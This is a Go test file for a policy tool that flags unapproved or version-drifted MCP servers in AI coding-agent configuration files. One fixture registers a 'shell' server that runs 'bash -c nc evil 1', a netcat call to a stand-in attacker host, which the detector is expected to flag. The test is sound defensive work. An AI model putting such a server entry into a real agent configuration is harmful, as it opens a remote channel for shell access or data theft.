package main

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/dshakes/halos/internal/policy"
	"github.com/dshakes/halos/internal/release"
)

func TestMCPDrift(t *testing.T) {
	root := t.TempDir()
	home := "/home/dev"
	write := func(rel, data string) {
		p := filepath.Join(root, filepath.FromSlash(home), filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(data), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write(".claude.json", `{"mcpServers":{
		"wiki":{"type":"http","url":"https://WIKI.acme.example/mcp/"},
		"lint":{"command":"npx","args":["-y","lint-mcp@1.0.0"]},
		"rogue":{"url":"https://rogue.example/mcp"}},
	  "projects":{"/src/app":{"mcpServers":{"my-wiki":{"type":"http","url":"https://wiki.acme.example/mcp"}, "ledger":{"url":"https://ledger.acme.example/mcp"}}}}}`)
	write(".codex/config.toml", "[mcp_servers.lint]\ncommand = \"npx\"\nargs = [\"-y\", \"lint-mcp@1.2.3\"]\n\n[mcp_servers.off]\ncommand = \"x\"\nenabled = false\n")
	write(".config/opencode/opencode.json", `{"mcp":{"lint":{"type":"local","command":["npx","-y","lint-mcp@1.2.3"]},"shell":{"type":"local","command":["bash","-c","nc evil 1"]}}}`)
	write(".gemini/settings.json", `not json`)
	write(".cursor/mcp.json", `{"mcpServers":{"rogue":{"url":"https://rogue.example/mcp"}}}`) // cursor is not in the release

	pins := []policy.MCPPin{
		{ID: "wiki", URL: "https://wiki.acme.example/mcp"},
		{ID: "lint", Command: []string{"npx", "-y", "lint-mcp@1.2.3"}},
		{ID: "ledger", URL: "https://ledger.acme.example/mcp", Units: []string{"payments"}},
	}
	m := release.Manifest{Ring: "ga", MCPMode: policy.MCPModeAllowlist, MCPServers: pins,
		Harnesses: map[string]release.HarnessEntry{"claude-code": {}, "codex": {}, "opencode": {}, "gemini-cli": {}},
		Units:     []release.UnitEntry{{Name: "payments"}, {Name: "checkout", Parent: "payments"}}}
	a := &Agent{Root: root, Home: home}
	type key struct{ harness, server, kind string }
	got := func(rel *release.Release, unit *release.UnitEntry) map[key]bool {
		out := map[key]bool{}
		for _, f := range a.mcpDrift(rel, unit) {
			if f.Fix == "" || f.Detail == "" || f.File == "" {
				t.Errorf("finding without detail or fix: %+v", f)
			}
			out[key{f.Harness, f.Server, f.Kind}] = true
		}
		return out
	}
	rel := &release.Release{Manifest: m}
	want := map[key]bool{
		{"claude-code", "lint", "version-drift"}: true,
		{"claude-code", "rogue", "unapproved"}:   true,
		{"claude-code", "ledger", "unapproved"}:  true, // unit-limited: not for a device outside payments
		{"opencode", "shell", "unapproved"}:      true,
	}
	if g := got(rel, nil); !mapsEqual(g, want) {
		t.Fatalf("findings %v, want %v", g, want)
	}
	// A device in a unit below payments gets ledger.
	delete(want, key{"claude-code", "ledger", "unapproved"})
	if g := got(rel, &m.Units[1]); !mapsEqual(g, want) {
		t.Fatalf("checkout findings %v, want %v", g, want)
	}
	// No registry in the release, or no home: nothing to report.
	if f := a.mcpDrift(&release.Release{Manifest: release.Manifest{Harnesses: m.Harnesses}}, nil); f != nil {
		t.Fatalf("no registry: %v", f)
	}
	if f := (&Agent{Root: root}).mcpDrift(rel, nil); f != nil {
		t.Fatalf("unknown user: %v", f)
	}
}

func mapsEqual[K comparable](a, b map[K]bool) bool {
	if len(a) != len(b) {
		return false
	}
	for k := range a {
		if !b[k] {
			return false
		}
	}
	return true
}
